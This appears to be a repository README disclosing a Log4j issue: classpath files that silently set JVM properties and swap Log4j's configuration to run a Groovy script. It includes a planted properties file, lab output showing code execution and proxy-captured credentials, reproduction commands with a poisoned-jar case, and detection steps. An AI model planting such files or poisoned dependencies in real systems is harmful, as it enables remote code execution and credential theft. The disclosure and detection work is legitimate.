# Apache Log4j — the classpath resources Log4j trusts without asking

> **Disclosure status — first and only public write-up of this security consequence.**
> The behaviour itself is a documented Log4j convenience. The *security* consequence — that a
> classpath resource silently reconfigures the JVM and takes over Log4j's configuration — had
> not been reported to the Apache Logging Services project, not sent to any vendor, not shared
> with any third party, and not published in an advisory, mailing list post, blog, conference
> talk, preprint, issue tracker, or chat anywhere else before this repository.
>
> If you run Log4j and this affects you, please forward this to the vendor:
> <security@apache.org> (the Apache Logging Services security process, per
> <https://logging.apache.org/security.html>).

**Component:** `org.apache.logging.log4j:log4j-api` (the property loader) and
`org.apache.logging.log4j:log4j-core` (the configuration it hijacks)
**Severity:** Critical
**CVSS 3.1:** `10.0 AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`
**CWE:** CWE-426 (untrusted search path) → CWE-94 (improper control of generation of code) /
CWE-200 (information exposure)
**Affected:** `log4j-api` / `log4j-core` 2.14.1 – **2.26.1** (current release) — verified by
execution; the 3.x API source carries the same mechanism (source-level, see *Limitations*)
**Found:** 2026-10-23

---

## 1. The defect in one paragraph

`log4j-api` reads two resources by fixed name from the classpath during its own initialization.
Neither file has to be requested, enabled, or mentioned in the application's configuration, and
neither produces a warning:

| file | effect |
| --- | --- |
| `log4j2.system.properties` | **every key is copied into the JVM system properties** |
| `log4j2.component.properties` | Log4j's own properties — configuration file location, script languages |

`log4j-api` 2.26.1, `org/apache/logging/log4j/util/PropertiesUtil.java:506-519`:

```java
private Environment(final PropertySource propertySource) {
    final PropertySource sysProps = new PropertyFilePropertySource(LOG4J_SYSTEM_PROPERTIES_FILE_NAME, false);
    try {
        sysProps.forEach((key, value) -> {
            if (System.getProperty(key) == null) {
                System.setProperty(key, value);          // global JVM state, from a classpath file
            }
        });
```

The file is found on the classpath through `util/PropertyFilePropertySource.java:50-55` →
`util/LoaderUtil.java:461-491`, which searches the thread-context class loader, Log4j's own
class loader and the **system class loader** — the application's entire classpath, jars
included.

Apache documents the mechanism in one line, with no security guidance attached
(<https://logging.apache.org/log4j/2.x/manual/systemproperties.html>):

> *"If a `log4j2.system.properties` file is available on the classpath its contents are sourced
> into Java system properties at Log4j startup."*

Two Log4j properties turn it into code execution: `log4j.configurationFile`
(`log4j-core` 2.26.1 `config/ConfigurationFactory.java:89`, read at `:457-460`) — the value may
name a **classpath resource**, so the attacker's configuration can travel inside the same jar —
and `log4j2.Script.enableLanguages` (`log4j-core` 2.26.1 `util/Constants.java:52`), which turns
on script execution that the attacker's configuration then uses.

**⇒ One file on the classpath reconfigures the JVM and replaces Log4j's configuration.**

## 2. Impact — remote code execution, measured

The planted `log4j2.system.properties` (three lines):

```properties
lab.planted=planted-by-attacker
log4j.configurationFile=pwn.xml
log4j2.Script.enableLanguages=Groovy
```

The planted `pwn.xml` on the same classpath: a normal Log4j configuration whose `ScriptFilter`
runs a Groovy script. Running an ordinary application — no Log4j configuration of its own, no
attacker-controlled log content, no MDC:

```
[1] planted system property BEFORE log4j init : null
=== PAYLOAD EXECUTED IN VICTIM JVM (planted config) ===
RCE via planted log4j2.system.properties (classpath pre-positioning) as hayden
uid=1000(hayden) gid=1000(hayden) groups=1000(hayden),4(adm),24(cdrom),27(sudo),...
=== END PAYLOAD ===
13:03:23 INFO  victim - first log statement triggers log4j initialization
[2] planted system property AFTER  log4j init : planted-by-attacker
[3] effective log4j config location             : pwn.xml
[4] script languages enabled                     : Groovy
[5] attacker script executed (marker file)       : true
```

The payload runs **before the victim's own log statement is rendered**: the attacker's
configuration replaces the victim's.

| vector | file on the classpath | result |
| --- | --- | --- |
| A — JVM system properties | `log4j2.system.properties` | RCE, plus arbitrary JVM system properties |
| B — Log4j configuration | `log4j2.component.properties` | RCE |
| C — supply chain | either file **inside a dependency jar** | RCE |

| log4j-core | 2.14.1 | 2.17.1 | 2.24.0 | 2.25.1 | **2.26.1** |
| --- | --- | --- | --- | --- | --- |
| RCE via planted classpath resource | yes | yes | yes | yes | **yes** |

Negative control — the same application without the planted file:

```
[2] planted system property AFTER  log4j init : null
[3] effective log4j config location             : null
[4] script languages enabled                     : null
[5] attacker script executed (marker file)       : false
```

## 3. The blast radius is `log4j-api`, not `log4j-core`

With **only `log4j-api` on the classpath** — no `log4j-core`, no appender, no configuration, and
the API reporting *"Log4j API could not find a logging provider"* — the planted file still
rewrites the JVM's system properties:

```
[api-only] planted property BEFORE log4j init : null
2026-10-23T17:03:44.240Z main ERROR Log4j API could not find a logging provider.
[api-only] planted property AFTER  log4j init : planted-by-attacker
[api-only] log4j.configurationFile             : pwn.xml
```

`log4j-api` is a transitive dependency of a large part of the Java ecosystem, so the exposed
population is "every application that has Log4j on its classpath", not "every application that
configured Log4j".

## 4. The plant reaches past Log4j

Because it sets **JVM** system properties, it reaches application behaviour that has nothing to
do with logging. With `http.proxyHost` / `http.proxyPort` planted, the victim's outbound request
went to the attacker's proxy:

```
--- victim stdout ---
[proxy-victim] http.proxyHost = 127.0.0.1
[proxy-victim] http.proxyPort = 8899
[proxy-victim] response status = 200
--- captured by attacker proxy ---
GET http://vault.internal/api/login?user=alice&token=s3cr3t HTTP/1.1
User-Agent: Java/1.8.0_504
Host: vault.internal
```

The credentials in the request URL were read by the attacker because a file on the classpath
said so.

## 5. Target, reach, impact at scale

* **Target** — the Java estate, not one application. The primitive lives in `log4j-api`, so every
  process that merely *has* Log4j on its classpath is a candidate: services that never configure
  Log4j, and applications whose only Log4j dependency is transitive.
* **Reach** — zero interaction and zero configuration: no attacker-controlled log content, no
  Thread Context Map, no optional Log4j feature, no cooperation from the application's
  configuration — the application's configuration is what gets overwritten. Nothing is printed;
  `StatusLogger` stays silent.
* **Pre-positioning** — one file with a fixed, guessable name in a directory that is on the
  victim's classpath and writable by someone else: a shared application server or deployment
  directory (`/opt/app/lib`, `WEB-INF/lib`) writable by the deploy account while the service runs
  as another account; a build agent or CI runner whose workspace is on the classpath (including
  the current directory, which is on the classpath for a large share of legacy start scripts); any
  writable directory in a container image passed with `-cp`.
* **Supply chain** — the file can equally live *inside a jar*; measured, a single jar carrying
  `log4j2.system.properties` and `pwn.xml` produced the same RCE. One poisoned or compromised
  artifact therefore reaches every application that resolves it, and the file stays inert until
  Log4j runs in that application. Nothing in the artifact looks like an attack — two small text
  files with innocuous names.
* **Impact at scale** — *access* (configuration hijack → script execution → RCE in the target
  JVM), *collection* (arbitrary JVM system properties: proxy, TLS trust store, and other
  lazily-read properties), *stealth* (the attacker's configuration decides what the logs
  contain).

Compared with the historical Log4Shell this is a different shape of risk: Log4Shell needed a
vulnerable Log4j version and attacker-controlled data in the log path; this works on the current
release, needs no vulnerable version and no attacker-controlled data, and needs nothing from the
application's configuration.

## 6. Reproduce it (localhost only)

```bash
./setup.sh                 # fetch jars + the Log4j sources cited in WORKUP.md
./lab/build.sh             # compile the victims
./lab/verify.sh            # 14 assertions over every claim in WORKUP.md
```

By hand:

```bash
# the planted classpath resource + the attacker's configuration
ls lab/poison/                       # log4j2.system.properties, pwn.xml
CP=lib/log4j-api-2.26.1.jar:lib/log4j-core-2.26.1.jar:lib/groovy-4.0.24.jar:lib/groovy-jsr223-4.0.24.jar
java -cp "$CP:lab/build/victim:lab/poison" lab.ClasspathPoison
# -> PAYLOAD EXECUTED IN VICTIM JVM (planted config)

# the supply-chain case: the planted resource inside a dependency jar
java -cp "$CP:lab/build/victim:lab/build/evil-dependency.jar" lab.ClasspathPoison

# the traffic impact
python3 lab/proxy_capture.py java -cp "lib/log4j-api-2.26.1.jar:lib/log4j-core-2.26.1.jar:lab/build/victim:lab/poison-proxy" lab.ProxyVictim
```

All traffic binds to `127.0.0.1`. The lab contacts no third-party host, scans nothing, and
carries no target list. The command it executes in the victim JVM is `id`.

## 7. Detection

* Find the files: `find / -name 'log4j2.*.properties'`, and inside every jar
  `unzip -l <jar> | grep log4j2`. `scan/scan_planted.py` does both (on disk and inside jars).
* Compare a running service's JVM system properties against the application's own configuration:
  any difference is the plant.
* Look for a Log4j configuration inside a jar or directory that the deployment did not put there.
* Look for outbound HTTP(S) from the application at start-up or at reconfiguration — a
  configuration that fetches a script from a URL is visible on the wire.
* `StatusLogger` messages: `Error running script …`, `No script with name … has been declared`.

## 8. Remediation

* Treat the classpath as a trust boundary: nothing on it may be writable by anyone other than
  the identity that runs the application, and every jar on it should be checksum-verified in CI.
* Do not ship `log4j2.system.properties` or `log4j2.component.properties` in an artifact unless
  that is the artifact's documented purpose.
* Upstream fix direction — Log4j should not silently promote a classpath resource into JVM
  system properties. At minimum it should (a) require an explicit opt-in for that behaviour,
  (b) log a warning through `StatusLogger` when either file is found, and (c) refuse to take the
  configuration file location from a classpath resource.

## 9. Repository contents

| Path | What it is |
| --- | --- |
| `WORKUP.md` | the full write-up: root cause with `file:line` evidence, the measured exploitability matrix, the target/reach/impact analysis, detection, remediation, and limitations |
| `lab/` | the proof-of-concept: victim apps, the planted classpath resources, the attacker-side proxy, and `verify.sh` |
| `scan/scan_planted.py` | finds planted Log4j classpath resources on disk and inside jars |
| `setup.sh` | downloads the jars and the sources the citations point at |
| `lib/`, `sources/`, `lab/build/` | downloaded artifacts and build output, created by `setup.sh` and `lab/build.sh` — not stored in git |

A sibling repository, `log4j-vuln-lab`, documents a separate finding in the same project:
configuration-time evaluation of untrusted Thread Context Map data.

## 10. Scope and ethics

* Every server in this repository listens on `127.0.0.1`; no external host is ever contacted.
* The payload executes `id` and writes a proof file; it does not persist, spread, or scan.
* No third-party system was tested, scanned, or contacted at any point.
* These labs are for testing systems you own or are authorised to test. Finding C needs a
  writable classpath entry or a poisoned dependency — that is the access condition, not a
  vulnerability in the target application.

## 11. Limitations

* Log4j 3.x is analysed at source level only: `log4j-core:3.0.0-beta3` needs
  `log4j-api:3.0.0-beta3`, which is not published (`log4j-api` stops at `3.0.0-beta2`), and the
  two do not load together. The 3.0.0-beta2 API source still contains the mechanism
  (`util/PropertiesUtil.java:70, 675-682`).
* The JMX variant was tested and rejected: the JMX agent reads its configuration during JVM
  start-up, before Log4j initializes. Properties the JVM reads at start-up are therefore out of
  reach; properties read lazily (proxy, TLS trust store, most libraries) are in reach.
* The plant needs a writable classpath entry or a poisoned dependency. That is the access
  condition; Log4j's contribution is that it trusts a fixed-name classpath resource implicitly,
  silently, and — for `log4j2.system.properties` — applies it as global JVM state.
* The script chain was demonstrated with Groovy; any other JSR-223 engine behaves the same.

## 12. License

Apache License 2.0 — see `LICENSE`.
